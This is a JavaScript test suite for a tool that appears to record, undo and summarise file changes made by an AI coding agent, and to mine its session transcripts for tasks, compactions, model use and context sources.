    bashHook(S, home, 'PreToolUse');
    assert.equal(core.readBashManifest(S), null, 'no manifest — the tree was never walked');
    fs.writeFileSync(path.join(home, '.bash_history'), 'one\ntwo\n');
    bashHook(S, home, 'PostToolUse');
    assert.equal(core.readLog(S).length, 0, 'and nothing under $HOME was recorded');
    const skips = core.readSkips(S);
    assert.equal(skips.length, 1, 'silence is not an option — one marker per command');
    assert.match(skips[0].reason, /home directory/, 'and it says why');

    // The stale-manifest trap: a command in a real project, THEN one in $HOME. If the guard returns
    // without clearing the manifest, Post diffs the project's manifest against a walk of $HOME.
    const proj = tmpWork();
    fs.writeFileSync(path.join(proj, 'a.ts'), 'a\n');
    bashHook(S, proj, 'PreToolUse');
    assert.ok(core.readBashManifest(S), 'positive control: a project directory IS walked');
    bashHook(S, home, 'PreToolUse');
    assert.equal(core.readBashManifest(S, home), null, 'the refused command has no snapshot of its own');
    // …and it does NOT wipe the project command's, which may still be running beside it: snapshots
    // are per-tree now, so a $HOME Post cannot consume a project snapshot anyway.
    assert.ok(core.readBashManifest(S, proj), 'a concurrent project command keeps its snapshot');
    bashHook(S, home, 'PostToolUse');
    assert.equal(core.readLog(S).length, 0, 'so nothing from $HOME is diffed into the log');

    // Positive control, end to end: the same hook pair over a project directory DOES capture.
    bashHook(S, proj, 'PreToolUse');
    fs.writeFileSync(path.join(proj, 'a.ts'), 'A\n');
    bashHook(S, proj, 'PostToolUse');
    assert.equal(core.readLog(S).length, 1, 'a project tree still captures — the probe works');
    assert.equal(path.basename(core.readLog(S)[0].file), 'a.ts');
  } finally {
    os.homedir = realHome;
    fs.rmSync(home, { recursive: true, force: true });
  }
});

test('capture: Bash at the filesystem root is refused for the same reason', () => {
  freshHome();
  const S = 'bash-root';
  bashHook(S, path.parse(process.cwd()).root, 'PreToolUse');
  assert.equal(core.readBashManifest(S), null, 'no manifest for /');
  assert.match(core.readSkips(S)[0].reason, /filesystem root/);
});

test('capture: bash memo — steady-state Pre is stat-only (zero file reads, zero new blobs)', () => {
  freshHome();
  const S = 'memo1';
  const cwd = tmpWork();
  fs.writeFileSync(path.join(cwd, 'a.txt'), 'alpha\n');
  fs.writeFileSync(path.join(cwd, 'b.bin'), Buffer.from([0, 1, 2, 0, 3])); // binary — negative verdict must be cached too
  // Age the files out of the racily-clean epsilon: files touched within ~2s of a cache write are
  // deliberately re-read (git's rule); steady state means files older than that.
  const aged = new Date(Date.now() - 10_000);
  fs.utimesSync(path.join(cwd, 'a.txt'), aged, aged);
  fs.utimesSync(path.join(cwd, 'b.bin'), aged, aged);
  bashHook(S, cwd, 'PreToolUse');
  bashHook(S, cwd, 'PostToolUse'); // no changes — warms the cache for the next call
  const blobsAfterFirst = blobCount(S);

  // Count reads of workdir files during the second Pre: the memo must not read ANY of them.
  const realRead = fs.readFileSync;
  let reads = 0;
  fs.readFileSync = function (p, ...rest) {
    if (typeof p === 'string' && p.startsWith(cwd + path.sep)) reads++;
    return realRead.call(fs, p, ...rest);
  };
  try {
    bashHook(S, cwd, 'PreToolUse');
  } finally {
    fs.readFileSync = realRead;
  }
  assert.equal(reads, 0, 'unchanged tree: no candidate file is read (binary included)');
  assert.equal(blobCount(S), blobsAfterFirst, 'no new blobs on a warm Pre');
  assert.ok(core.readBashManifest(S), 'manifest still written from cached hashes');
  core.deleteBashManifest(S);
});

test('capture: bash memo self-heals a GC-collected blob (no dangling beforeBlob ever)', () => {
  freshHome();
  const S = 'memo2';
  const cwd = tmpWork();
  const F = path.join(cwd, 'f.txt');
  fs.writeFileSync(F, 'v1\n');
  bashHook(S, cwd, 'PreToolUse');
  bashHook(S, cwd, 'PostToolUse'); // cache warm, blob for v1 exists but is manifest-orphaned
  // Simulate routine GC: remove ALL blobs (nothing references them — the log is empty).
  const bdir = path.join(core.storeDir(S), 'blobs');
  for (const b of fs.readdirSync(bdir)) fs.unlinkSync(path.join(bdir, b));
  // Next command changes the file: Pre must re-write the before-blob despite the warm cache.
  bashHook(S, cwd, 'PreToolUse');
  fs.writeFileSync(F, 'v2\n');
  bashHook(S, cwd, 'PostToolUse');
  const rec = core.readLog(S).find((r) => r.file === F && r.afterBlob !== null);
  assert.ok(rec, 'the change was recorded');
  assert.ok(rec.beforeBlob, 'record carries a before-blob');
  assert.ok(fs.existsSync(path.join(bdir, rec.beforeBlob)), 'beforeBlob content exists on disk (undo works)');
  assert.ok(fs.existsSync(path.join(bdir, rec.afterBlob)), 'afterBlob content exists on disk');
});

test('capture: bash deletion detection survives the memo', () => {
  freshHome();
  const S = 'memo3';
  const cwd = tmpWork();
  const F = path.join(cwd, 'gone.txt');
  fs.writeFileSync(F, 'bye\n');
  bashHook(S, cwd, 'PreToolUse');
  bashHook(S, cwd, 'PostToolUse'); // warm
  bashHook(S, cwd, 'PreToolUse');
  fs.unlinkSync(F);
  bashHook(S, cwd, 'PostToolUse');
  const rec = core.readLog(S).find((r) => r.file === F);
  assert.ok(rec, 'deletion recorded');
  assert.equal(rec.afterBlob, null, 'deletion has null afterBlob');
  assert.ok(fs.existsSync(path.join(core.storeDir(S), 'blobs', rec.beforeBlob)), 'restore content preserved');
});

test('capture: racily-clean same-size rewrite inside the epsilon is still detected', () => {
  freshHome();
  const S = 'memo4';
  const cwd = tmpWork();
  const F = path.join(cwd, 'r.txt');
  fs.writeFileSync(F, 'AAAA\n');
  const st0 = fs.statSync(F);
  bashHook(S, cwd, 'PreToolUse'); // cache written NOW; F's mtime is within the 2s epsilon
  // Same-size rewrite with the ORIGINAL mtime restored — (mtimeMs,size) alone cannot see this.
  fs.writeFileSync(F, 'BBBB\n');
  fs.utimesSync(F, st0.atime, st0.mtime);
  bashHook(S, cwd, 'PostToolUse');
  const rec = core.readLog(S).find((r) => r.file === F);
  assert.ok(rec, 'epsilon re-hash caught the same-size same-mtime rewrite');
});

test('clean: stub-session husks are reclaimed; live and reviewed sessions are untouched', () => {
  freshHome();
  // A stub husk: blobs from a Bash walk, no log ever (the /effort-session shape).
  const STUB = 'stub-husk';
  core.ensureStore(STUB);
  core.writeBlob(STUB, Buffer.from('walk snapshot A'));
  core.writeBlob(STUB, Buffer.from('walk snapshot B'));
  // A live first-turn session: bash manifest in staging (command running right now).
  const LIVE = 'live-midbash';
  core.ensureStore(LIVE);
  const liveBlob = core.writeBlob(LIVE, Buffer.from('before content'));
  core.writeBashManifest(LIVE, { files: { '/w/f.txt': liveBlob }, ts: Date.now() });
  // A real session with a reviewable edit.
  const REAL = 'real-edits';
  seedEdit(REAL, '/w/app.js', 'a\n', 'b\n');

  for (const id of core.allStoreSessionIds()) {
    core.gcSession(id);
    core.pruneEmptySession(id);
  }
  assert.ok(!fs.existsSync(core.storeDir(STUB)), 'stub husk removed entirely');
  assert.ok(fs.existsSync(core.storeDir(LIVE)), 'mid-bash session kept');
  assert.ok(core.readBashManifest(LIVE), 'its manifest survives');
  assert.ok(fs.existsSync(path.join(core.storeDir(LIVE), 'blobs', liveBlob)), 'its before-blob survives (manifest-referenced)');
  assert.equal(core.readLog(REAL).length, 1, 'reviewed session untouched');
  core.deleteBashManifest(LIVE);
});

// --- round-2 sweep: shared predicates, formatting, bin resolution, and the UTF-8 merge guard -------

test('filter: matchesQuery — case-insensitive substring; empty/whitespace query matches all', () => {
  assert.equal(core.matchesQuery('src/Foo Bar.ts', 'foo'), true);
  assert.equal(core.matchesQuery('src/Foo Bar.ts', 'BAR'), true);
  assert.equal(core.matchesQuery('src/Foo Bar.ts', 'baz'), false);
  assert.equal(core.matchesQuery('anything', ''), true);
  assert.equal(core.matchesQuery('anything', '   '), true, 'whitespace-only query matches all');
});

test('format: relTime boundaries incl. the new week/month buckets', () => {
  const now = 1_784_300_000_000;
  const at = (deltaSec) => core.relTime(now - deltaSec * 1000, now);
  assert.equal(at(59), '59s ago');
  assert.equal(at(60), '1m ago');
  assert.equal(at(59 * 60), '59m ago');
  assert.equal(at(60 * 60), '1h ago');
  assert.equal(at(23 * 3600), '23h ago');
  assert.equal(at(24 * 3600), '1d ago');
  assert.equal(at(13 * 86400), '13d ago');
  assert.equal(at(14 * 86400), '2w ago', 'days cap at 13, then weeks');
  assert.equal(at(60 * 86400), '8w ago');
  assert.equal(at(62 * 86400), '2mo ago', 'weeks cap at ~2 months, then months');
  assert.equal(core.relTime(now + 5000, now), '0s ago', 'future timestamps clamp to zero');
});

test('analyze: resolveClaudeBin precedence — configured > env > well-known paths > bare name', () => {
  const home = freshHome();
  const fakeDir = fs.mkdtempSync(path.join(os.tmpdir(), 'cc-bin-'));
  const fakeBin = path.join(fakeDir, 'claude');
  fs.writeFileSync(fakeBin, '#!/bin/sh\n', { mode: 0o755 });
  const OLD = process.env.CLAUDE_BIN;
  try {
    process.env.CLAUDE_BIN = fakeBin;
    assert.equal(core.resolveClaudeBin('/configured/claude-not-on-disk'), fakeBin,
      'a configured path that does not exist falls through to the env candidate');
    assert.equal(core.resolveClaudeBin(fakeBin), fakeBin, 'an existing configured path wins outright');
    delete process.env.CLAUDE_BIN;
    // fresh HOME has no ~/.local/bin etc. candidates; may still find a real system claude —
    // accept either the bare-name fallback or an absolute existing path, never a bogus one.
    const got = core.resolveClaudeBin();
    assert.ok(got === 'claude' || fs.existsSync(got), `fallback is PATH name or a real file (got ${got})`);
  } finally {
    if (OLD === undefined) delete process.env.CLAUDE_BIN;
    else process.env.CLAUDE_BIN = OLD;
  }
});

test('tasks: taskSnaps anchors a create via its result text, then snapshots each update', () => {
  freshHome();
  const proj = fs.mkdtempSync(path.join(os.tmpdir(), 'cc-tx-'));
  const tx = path.join(proj, 't.jsonl');
  fs.writeFileSync(tx, [
    JSON.stringify({ type: 'assistant', timestamp: '2026-07-17T10:00:00Z', message: { role: 'assistant', content: [
      { type: 'tool_use', id: 't1', name: 'TaskCreate', input: { subject: 'Fix the parser', description: '' } },
    ] } }),
    // the assigned id only appears in the tool_result text — the mining anchors on it
    JSON.stringify({ type: 'user', timestamp: '2026-07-17T10:00:01Z', message: { role: 'user', content: [
      { type: 'tool_result', tool_use_id: 't1', content: 'Task #1 created successfully: Fix the parser' },
    ] } }),
    JSON.stringify({ type: 'assistant', timestamp: '2026-07-17T10:00:02Z', message: { role: 'assistant', content: [
      { type: 'tool_use', id: 't2', name: 'TaskUpdate', input: { taskId: '1', status: 'completed' } },
    ] } }),
  ].join('\n'));
  const snaps = core.taskSnaps(tx);
  assert.equal(snaps.length, 2, 'one snapshot at create-result, one at update');
  assert.equal(snaps[0].todos[0].content, 'Fix the parser');
  assert.equal(snaps[0].todos[0].status, 'pending');
  assert.equal(snaps[1].todos[0].status, 'completed', 'update snapshot reflects the new status');
  assert.equal(snaps[1].todos[0].src, 'task', 'task-born items are marked so ribbons skip them');
});

test('undo: non-UTF-8 file on the MERGE path refuses (conflict) instead of corrupting to U+FFFD', () => {
  freshHome();
  const S = 'latin1';
  const F = path.join(tmpWork(), 'legacy.txt');
  // Latin-1 content: "caf<0xE9>\n" — not valid UTF-8, but capturable (isBinary only screens NUL).
  const v1 = Buffer.from([0x63, 0x61, 0x66, 0xe9, 0x0a, 0x41, 0x0a]); // café\nA\n
  const v2 = Buffer.from([0x63, 0x61, 0x66, 0xe9, 0x0a, 0x42, 0x0a]); // café\nB\n  (edit #1: A->B)
  const v3 = Buffer.from([0x63, 0x61, 0x66, 0xe9, 0x0a, 0x42, 0x0a, 0x43, 0x0a]); // + C\n (edit #2)
  core.ensureStore(S);
  const b1 = core.writeBlob(S, v1), b2 = core.writeBlob(S, v2), b3 = core.writeBlob(S, v3);
  core.appendLog(S, { ts: 1000, tool: 'Edit', file: F, beforeBlob: b1, afterBlob: b2, status: 'pending' });
  core.appendLog(S, { ts: 2000, tool: 'Edit', file: F, beforeBlob: b2, afterBlob: b3, status: 'pending' });
  fs.writeFileSync(F, v3);
  const res = core.undoEdit(S, 1); // later edit #2 exists -> merge path
  assert.equal(res.status, 'conflict', 'non-UTF-8 merge refuses rather than rewrites');
  assert.ok(Buffer.compare(fs.readFileSync(F), v3) === 0, 'file bytes untouched — 0xE9 preserved');
  // The byte-exact escape hatch still works: whole-file restore (drops later edits, raw bytes).
  const forced = core.restoreFile(S, 1);
  assert.ok(forced.ok, 'force restore succeeds');
  assert.ok(Buffer.compare(fs.readFileSync(F), v1) === 0, 'restore path is byte-exact (0xE9 intact)');
});

test('undo: valid multibyte UTF-8 (emoji/CJK) still merges on the surgical path', () => {
  freshHome();
  const S = 'utf8ok';
  const F = path.join(tmpWork(), 'i18n.txt');
  const v1 = '日本語 🎉\nline A\n';
  const v2 = '日本語 🎉\nline B\n';   // edit #1: A->B
  const v3 = '日本語 🎉\nline B\nline C 世界\n'; // edit #2: append (different line)
  core.ensureStore(S);
  const b1 = core.writeBlob(S, Buffer.from(v1)), b2 = core.writeBlob(S, Buffer.from(v2)), b3 = core.writeBlob(S, Buffer.from(v3));
  core.appendLog(S, { ts: 1000, tool: 'Edit', file: F, beforeBlob: b1, afterBlob: b2, status: 'pending' });
  core.appendLog(S, { ts: 2000, tool: 'Edit', file: F, beforeBlob: b2, afterBlob: b3, status: 'pending' });
  fs.writeFileSync(F, v3);
  const res = core.undoEdit(S, 1); // merge path (later edit #2 exists)
  assert.equal(res.status, 'undone', 'valid multibyte content merges — round-trip guard does not false-positive');
  const after = fs.readFileSync(F, 'utf8');
  assert.ok(after.includes('line A'), 'edit #1 undone');
  assert.ok(after.includes('line C 世界'), 'later edit #2 preserved');
  assert.ok(after.includes('🎉'), 'emoji intact');
});

test('diagnose: a broken/looping symlink does not suppress the warning for a real symlinked dir', () => {
  freshHome();
  const work = tmpWork();
  core.installHooks('claude-observatory capture #' + core.HOOK_MARKER, core.settingsPath());
  const realDir = path.join(work, 'realpkg');
  fs.mkdirSync(realDir, { recursive: true });
  fs.symlinkSync(realDir, path.join(work, 'goodlink'), 'dir');   // genuine symlinked dir -> should warn
  fs.symlinkSync(path.join(work, 'nowhere'), path.join(work, 'deadlink')); // dangling -> statSync throws
  const checks = core.diagnose({ cwd: work, binOnPath: true, jqPresent: true });
  const c = checks.find((x) => x.id === 'symlink-subtrees');
  assert.ok(c, 'the symlink warning still fires despite a sibling broken link');
  assert.match(c.detail, /goodlink/, 'names the real symlinked directory');
});

test('undo: an oversized current file routes to conflict instead of throwing', () => {
  freshHome();
  const S = 'huge';
  const F = path.join(tmpWork(), 'big.txt');
  core.ensureStore(S);
  const b1 = core.writeBlob(S, Buffer.from('a\n')), b2 = core.writeBlob(S, Buffer.from('b\n'));
  const b3 = core.writeBlob(S, Buffer.from('c\n'));
  core.appendLog(S, { ts: 1000, tool: 'Edit', file: F, beforeBlob: b1, afterBlob: b2, status: 'pending' });
  core.appendLog(S, { ts: 2000, tool: 'Edit', file: F, beforeBlob: b2, afterBlob: b3, status: 'pending' });
  // Real Buffer whose toString('utf8') throws — simulates a >512MB file without allocating one.
  const realRead = fs.readFileSync;
  const throwing = Buffer.from('c\n');
  throwing.toString = () => { throw new RangeError('Cannot create a string longer than 0x1fffffe8 characters'); };
  fs.readFileSync = (p, ...rest) => (p === F ? throwing : realRead(p, ...rest));
  try {
    const res = core.undoEdit(S, 1);
    assert.equal(res.status, 'conflict', 'oversized file degrades to conflict, no throw');
  } finally {
    fs.readFileSync = realRead;
  }
});

test('actions: agentPhase counts child agent activity — a live agent fleet keeps the session working (0.8.6)', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const S = 'childphase';
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const tx = path.join(proj, S + '.jsonl');
  // A COMPLETED turn (assistant spoke, no tool call), long stale => classifies done on its own.
  fs.writeFileSync(tx, JSON.stringify({ timestamp: '2026-07-15T10:00:00.000Z', message: { role: 'assistant', content: [{ type: 'text', text: 'spawned the fleet' }] } }) + '\n');
  const old = (Date.now() - 60 * 60_000) / 1000; // utimes takes seconds
  fs.utimesSync(tx, old, old);
  assert.equal(core.agentPhase(tx), 'done', 'stale main transcript alone reads done');
  // A FRESH workflow agent transcript flips the session to working — the fleet is churning.
  const wfDir = path.join(proj, S, 'subagents', 'workflows', 'wf_x');
  fs.mkdirSync(wfDir, { recursive: true });
  const child = path.join(wfDir, 'agent-a1.jsonl');
  fs.writeFileSync(child, JSON.stringify({ message: { role: 'assistant', content: [] } }) + '\n');
  const pd = core.agentPhaseDetail(tx);
  assert.equal(pd.phase, 'working', 'fresh child agent activity keeps the session working');
  assert.equal(pd.confidence, 'high', 'a just-written child is structural-grade evidence');
  // Age the child out too => the session reads done again (children cannot keep a dead run alive).
  fs.utimesSync(child, old, old);
  assert.equal(core.agentPhase(tx), 'done', 'stale children do not resurrect the session');
});

test('workflows: script-meta phases parse when the harness serializes {"title":…} with quoted keys (0.8.6)', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const S = 'wfquoted';
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  fs.writeFileSync(path.join(proj, S + '.jsonl'), '');
  const wfDir = path.join(proj, S, 'subagents', 'workflows', 'wf_q');
  fs.mkdirSync(wfDir, { recursive: true });
  fs.writeFileSync(path.join(wfDir, 'journal.jsonl'), JSON.stringify({ type: 'started', key: 'v2:abc', agentId: 'a1' }) + '\n');
  fs.writeFileSync(
    path.join(wfDir, 'agent-a1.jsonl'),
    JSON.stringify({ timestamp: '2026-07-15T10:00:00.000Z', message: { role: 'assistant', id: 'm1', usage: { input_tokens: 5, output_tokens: 5 }, content: [] } }) + '\n'
  );
  const scripts = path.join(proj, S, 'workflows', 'scripts');
  fs.mkdirSync(scripts, { recursive: true });
  fs.writeFileSync(
    path.join(scripts, 'myflow-wf_q.js'),
    'export const meta = {\n  name: \'myflow\',\n  description: \'quoted-key phases\',\n  phases: [{"title":"Scope","detail":"d1"},{"title":"Search","detail":"d2"}],\n}\n'
  );
  const wfs = core.parseWorkflows(cwd, S);
  assert.equal(wfs.length, 1, 'the run is discovered from its wf_ dir');
  assert.equal(wfs[0].name, 'myflow');
  assert.deepEqual(wfs[0].phases, ['Scope', 'Search'], 'titles only — never the flattened title/detail string soup');
});

test('tasks: allSessionTaskRows folds background Agent runs into the Tasks tab (new harness task system, 0.8.6)', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const S = 'agenttasks';
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  const subDir = path.join(proj, S, 'subagents');
  fs.mkdirSync(subDir, { recursive: true });
  fs.writeFileSync(path.join(proj, S + '.jsonl'), '');
  fs.writeFileSync(
    path.join(subDir, 'agent-abc123.jsonl'),
    JSON.stringify({ timestamp: '2026-07-15T10:00:00.000Z', message: { role: 'assistant', id: 'm1', content: [{ type: 'text', text: 'done' }] } }) + '\n'
  );
  fs.writeFileSync(path.join(subDir, 'agent-abc123.meta.json'), JSON.stringify({ agentType: 'Explore', description: 'Scan the docs', spawnDepth: 1 }));
  const old = (Date.now() - 60 * 60_000) / 1000;
  fs.utimesSync(path.join(subDir, 'agent-abc123.jsonl'), old, old);
  const rows = core.allSessionTaskRows(cwd, S);
  assert.equal(rows.length, 1, 'the agent run IS the task list on the new harness');
  assert.equal(rows[0].id, 'a1', 'spawn-order display key, distinct from legacy numeric ids');
  assert.equal(rows[0].subject, 'Scan the docs', 'subject = the spawn description');
  assert.equal(rows[0].status, 'completed', 'a finished agent reads completed');
  assert.ok(rows[0].description.includes('Explore'), 'agent type rides in the description');
  assert.equal(rows[0].activeForm, null, 'no activeForm once the agent stops');
});

test('observe: listSessionsWithTitles pairs store sessions with their transcript titles (0.8.6 pickers)', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const S = 'titledlist';
  const cwd = tmpWork();
  seedEdit(S, path.join(cwd, 'a.txt'), 'x', 'y'); // the store session the pickers list
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  fs.writeFileSync(path.join(proj, S + '.jsonl'), JSON.stringify({ type: 'ai-title', aiTitle: 'Refactor the parser' }) + '\n');
  const rows = core.listSessionsWithTitles(cwd);
  const row = rows.find((r) => r.id === S);
  assert.ok(row, 'store session listed');
  assert.equal(row.title, 'Refactor the parser', 'title mined from the transcript ai-title');

  // A first-PROMPT fallback (no ai-title) stays short: first sentence, then a 64-char hard cap.
  const S2 = 'longprompt';
  seedEdit(S2, path.join(cwd, 'b.txt'), 'x', 'y');
  fs.writeFileSync(
    path.join(proj, S2 + '.jsonl'),
    JSON.stringify({ type: 'user', message: { role: 'user', content: 'Run the "deep-research" workflow. Deep research harness with a very long tail of instructions that would swamp a one-line picker row.' } }) + '\n'
  );
  const row2 = core.listSessionsWithTitles(cwd).find((r) => r.id === S2);
  assert.equal(row2.title, 'Run the "deep-research" workflow.', 'fallback trims to the first sentence');

  const S3 = 'runonprompt';
  seedEdit(S3, path.join(cwd, 'c.txt'), 'x', 'y');
  fs.writeFileSync(
    path.join(proj, S3 + '.jsonl'),
    JSON.stringify({ type: 'user', message: { role: 'user', content: 'please refactor the ingestion pipeline so that every stage reports progress and the whole thing can resume from a checkpoint without reprocessing' } }) + '\n'
  );
  const row3 = core.listSessionsWithTitles(cwd).find((r) => r.id === S3);
  assert.ok(row3.title.length <= 64, 'sentence-less prompts hard-cap at 64');
  assert.ok(row3.title.endsWith('…'), 'capped titles end with an ellipsis');
});

// --- 0.8.6: session vitals (model/effort), compaction visibility, footprint, context sources ---

test('metrics: sessionVitals reports the CURRENT model, keeps the full set, and never counts sidechains or <synthetic> (0.8.6)', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const S = 'vitalsModel';
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  // A real session that switched models mid-flight (/model, or fast mode): the chip must show what it
  // is running on NOW, while still disclosing that it switched. `<synthetic>` records are harness
  // filler with no model behind them, and sidechain turns belong to subagents that may run a
  // different model entirely — counting either would misreport the session's own model.
  const turn = (id, model, extra = {}) =>
    JSON.stringify({
      timestamp: new Date(extra.ts || 1000).toISOString(),
      type: 'assistant',
      isSidechain: extra.isSidechain === true,
      effort: extra.effort,
      message: { role: 'assistant', id, model, usage: { input_tokens: 5, output_tokens: 1 }, content: [] },
    });
  fs.writeFileSync(
    path.join(proj, S + '.jsonl'),
    [
      turn('m1', 'claude-opus-4-8', { ts: 1000 }),
      turn('m2', 'claude-opus-4-8', { ts: 2000 }),
      turn('m3', 'claude-sonnet-5', { ts: 3000, isSidechain: true }), // a subagent's model
      turn('m4', '<synthetic>', { ts: 4000 }),
      turn('m5', 'claude-fable-5', { ts: 5000 }),
    ].join('\n') + '\n'
  );
  const v = core.sessionVitals(cwd, S);
  assert.equal(v.model.id, 'claude-fable-5', 'the latest main-chain turn is what the session runs on now');
  assert.equal(v.model.label, 'Fable 5', 'raw ids are labelled through the shared friendlyModel');
  assert.deepEqual(v.models.map((m) => m.id), ['claude-opus-4-8', 'claude-fable-5'], 'both real models listed, first-seen order; sidechain + <synthetic> excluded');
  assert.equal(v.models[0].turns, 2, 'per-model turn counts back the chip tooltip');
  assert.equal(v.effort, null, 'effort is unknown here — reported as null, never guessed to a default');
});

test('metrics: sessionVitals takes effort from the assistant record, falling back to a /effort stub (0.8.6)', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const stub = (text) => JSON.stringify({ timestamp: new Date(1000).toISOString(), type: 'user', message: { role: 'user', content: text } });
  const turn = (id, effort, ts) =>
    JSON.stringify({ timestamp: new Date(ts).toISOString(), type: 'assistant', effort, message: { role: 'assistant', id, model: 'claude-opus-4-8', usage: { input_tokens: 5 }, content: [] } });

  // Current builds stamp `effort` on every assistant record — the latest wins after a mid-session switch.
  fs.writeFileSync(path.join(proj, 'effRec.jsonl'), [turn('a', 'max', 1000), turn('b', 'xhigh', 2000)].join('\n') + '\n');
  const rec = core.sessionVitals(cwd, 'effRec');
  assert.deepEqual([rec.effort.level, rec.effort.source], ['xhigh', 'record'], 'latest structural effort wins');

  // Older transcripts have no such field; the only trace is the /effort command stub. Both wordings
  // ("this session only" / "saved as your default") occur, and unknown levels pass through verbatim.
  fs.writeFileSync(
    path.join(proj, 'effStub.jsonl'),
    [
      stub('<local-command-stdout>Set effort level to max (this session only): …</local-command-stdout>'),
      stub('<local-command-stdout>Set effort level to ultracode (this session only): xhigh + dynamic workflow orchestration</local-command-stdout>'),
      turn('c', undefined, 3000),
    ].join('\n') + '\n'
  );
  const st = core.sessionVitals(cwd, 'effStub');
  assert.deepEqual([st.effort.level, st.effort.source], ['ultracode', 'stub'], 'newest stub wins and an unknown level is not normalised away');
});

test('actions: a compact_boundary becomes a first-class row, with this event\'s drop — not the cumulative one (0.8.6)', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const S = 'compactRows';
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  // Verbatim shape from a real transcript. compactMetadata.cumulativeDroppedTokens is a RUNNING
  // SESSION TOTAL (986k, then 1.97M across two compactions) — rendering it as one event's drop would
  // overstate every compaction after the first, so droppedTokens is derived as pre − post.
  const boundary = (ts, pre, post, cumulative, durationMs) =>
    JSON.stringify({
      timestamp: new Date(ts).toISOString(),
      type: 'system',
      subtype: 'compact_boundary',
      content: 'Conversation compacted',
      isSidechain: false,
      compactMetadata: { trigger: 'auto', preTokens: pre, postTokens: post, cumulativeDroppedTokens: cumulative, durationMs },
    });
  fs.writeFileSync(
    path.join(proj, S + '.jsonl'),
    [boundary(1000, 1000140, 13883, 986257, 125455), boundary(2000, 999467, 14222, 1971502, 116315)].join('\n') + '\n'
  );
  const acts = core.parseActions(cwd, S);
  assert.equal(acts.length, 2, 'a compaction earns a row even though its record carries no `message`');
  assert.equal(acts[0].category, 'compact', 'rows land in their own category');
  assert.equal(acts[0].compact.droppedTokens, 986257, 'first event: pre − post');
  assert.equal(acts[1].compact.droppedTokens, 985245, "second event's own drop, not the 1.97M running total");
  assert.equal(acts[1].compact.cumulativeDropped, 1971502, 'the cumulative figure is still carried, clearly named');
  assert.equal(core.compactLabel(acts[0].compact), 'auto · 1M→14k · 986k dropped · 2m 5s', 'one label builder every surface shares');
  const groups = core.buildActionGroups(acts, false);
  assert.ok(groups.some((g) => g.category === 'compact' && g.label === 'Compactions'), 'curated by default — a lost context is never hidden behind "show all"');
});

test('changemap: compactions ride the map ordered by time, with the shared label', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const S = 'compactPlace';
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const F = path.join(cwd, 'a.js');
  seedEdit(S, F, 'a\n', 'a\nb\n'); // ts = 1000 (seedEdit's synthetic clock)
  const boundary = (ts) =>
    JSON.stringify({ timestamp: new Date(ts).toISOString(), type: 'system', subtype: 'compact_boundary', compactMetadata: { trigger: 'auto', preTokens: 900, postTokens: 100, cumulativeDroppedTokens: 800, durationMs: 5 } });
  fs.writeFileSync(path.join(proj, S + '.jsonl'), [boundary(4000), boundary(2000)].join('\n') + '\n');
  const cm = core.buildChangeMap(cwd, S);
  assert.equal(cm.summary.compactions, 2, 'the headline count reaches the Overview');
  assert.deepEqual(cm.compactions.map((x) => x.ts), [2000, 4000], 'oldest first, by time — never transcript order');
  assert.equal(cm.compactions[0].droppedTokens, 800, 'per-event drop = pre − post, never the cumulative figure');
  assert.ok(cm.compactions[0].label.includes('→'), 'the shared label rides along so renderers stay thin');
  assert.ok(!('afterChapterId' in cm.compactions[0]) && !('afterSubtaskId' in cm.compactions[0]),
    'no display-anchor field — Actions and Stats render by ts (0.8.8); the field shipped as afterChapterId');
});

test('observe: contextSources separates what the transcript PROVES from what is merely present (0.8.6)', () => {
  const home = freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const S = 'ctxSrc';
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const plansDir = path.join(home, '.claude', 'plans');
  fs.mkdirSync(plansDir, { recursive: true });
  const planFile = path.join(plansDir, 'refactor.md');
  fs.writeFileSync(planFile, '# plan\n');
  fs.writeFileSync(path.join(cwd, 'CLAUDE.md'), '# project rules\n'); // present, but injected invisibly
  const use = (ts, name, input) =>
    JSON.stringify({ timestamp: new Date(ts).toISOString(), type: 'assistant', message: { role: 'assistant', content: [{ type: 'tool_use', id: 'u' + ts, name, input }] } });
  fs.writeFileSync(
    path.join(proj, S + '.jsonl'),
    [
      JSON.stringify({ timestamp: new Date(500).toISOString(), type: 'user', isCompactSummary: true, message: { role: 'user', content: 'This session is being continued from a previous conversation…' } }),
      use(1000, 'Skill', { skill: 'dataviz' }),
      use(2000, 'Write', { file_path: planFile }),
      use(3000, 'Read', { file_path: planFile }),
    ].join('\n') + '\n'
  );
  const rep = core.contextSources(cwd, S);
  const byKind = (k) => rep.sources.filter((s) => s.kind === k);
  assert.equal(byKind('skill')[0].label, 'skill: dataviz', 'an invoked skill is transcript-proven context');
  assert.equal(byKind('skill')[0].evidence, 'transcript', 'and is labelled as such');
  const plan = byKind('plan')[0];
  assert.equal(plan.count, 2, 'repeat touches aggregate into one row with a count');
  assert.equal(plan.detail, 'read and written this session', 'a file both read and written says so — reporting only the first touch would misdescribe it');
  const md = byKind('claude-md')[0];
  assert.equal(md.evidence, 'file-present', 'CLAUDE.md is auto-loaded system-prompt-side, so presence is all we can honestly claim');
  assert.ok(byKind('compact-summary').length === 1, 'being resumed from a compaction is itself a context source');
  assert.ok(/never record/.test(rep.note), 'the payload carries the caveat both editors render');
});

